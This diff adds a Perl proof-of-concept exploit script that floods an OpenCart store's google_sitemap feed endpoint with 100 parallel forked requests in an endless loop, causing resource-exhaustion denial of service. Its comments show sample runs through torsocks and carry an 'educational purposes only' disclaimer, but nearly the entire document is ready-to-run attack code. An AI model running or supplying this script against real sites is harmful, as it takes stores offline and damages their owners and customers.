@@ -1,0 +1,76 @@
+#!/usr/bin/perl -w
+#
+#  Opencart <= 3.0.2.0 google_sitemap Remote Denial of Service (resource exhaustion)
+#
+#  Copyright 2018 (c) Todor Donev <todor.donev at gmail.com>
+#  https://ethical-hacker.org/
+#  https://facebook.com/ethicalhackerorg
+#
+#  Tested store with added more than 1000 products
+#
+#  [todor@adamantium cartkiller]# torsocks perl killcart.pl example.com
+#  Opencart <= 3.0.2.0 google_sitemap Remote Denial of Service (resource exhaustion)
+#  Connecting example.com with 80 forks..
+#  Bye, bye and good night..
+#  Bye, bye and good night..
+#  Bye, bye and good night..
+#  ^C
+#  [todor@adamantium cartkiller]# 
+#
+#
+#  Disclaimer:
+#  This or previous programs is for Educational 
+#  purpose ONLY. Do not use it without permission. 
+#  The usual disclaimer applies, especially the 
+#  fact that Todor Donev is not liable for any 
+#  damages caused by direct or indirect use of the 
+#  information or functionality provided by these 
+#  programs. The author or any Internet provider 
+#  bears NO responsibility for content or misuse 
+#  of these programs or any derivatives thereof.
+#  By using these programs you accept the fact 
+#  that any damage (dataloss, system crash, 
+#  system compromise, etc.) caused by the use 
+#  of these programs is not Todor Donev's 
+#  responsibility.
+#   
+#  Use them at your own risk!
+#
+#  This exploit is buggy and proof of concept
+# 
+use Parallel::ForkManager;
+use LWP;
+print "Opencart <= 3.0.2.0 google_sitemap Remote Denial of Service (resource exhaustion)\n";
+sub usage{
+    print "usg: perl $0 <host>\n";
+    print "exmpl: perl $0 www.example.com\n";
+    print "https://ethical-hacker.org/\n";
+    print "https://facebook.com/ethicalhackerorg\n";
+    print "Copyright 2018 (c) Todor Donev <todor.donev at gmail.com>\n";
+}
+if ($#ARGV < 0) {
+    usage;
+    exit;
+}
+my $numforks = 100;
+print "Connecting $ARGV[0] with $numforks forks..\n";
+sub killcart{
+my $pm = new Parallel::ForkManager($numforks);
+$|=1;
+srand(time());
+for ($k=0;$k<$numforks;$k++) {
+$pm->start and next;   
+my $browser  = LWP::UserAgent ->new(ssl_opts => { verify_hostname => 0 },protocols_allowed => ['https']);
+#   $browser->timeout(20);
+   $browser->agent('Mozilla/5.0');
+my $response = $browser->get("https://$ARGV[0]/index.php?route=extension/feed/google_sitemap");
+print "Loop detected: Opencart is still vulnerable but seems server is correct configured. Change forks.\n" if($response->code eq 508);
+print "Kill me! Google_Sitemap is turned off..\n" if($response->code eq 404);
+print "Bye, bye and good night..\n" if(($response->code eq 503 or $response->code eq 504));
+$pm->finish;
+}
+$pm->wait_all_children;
+}
+while(1) {
+killcart();
+}
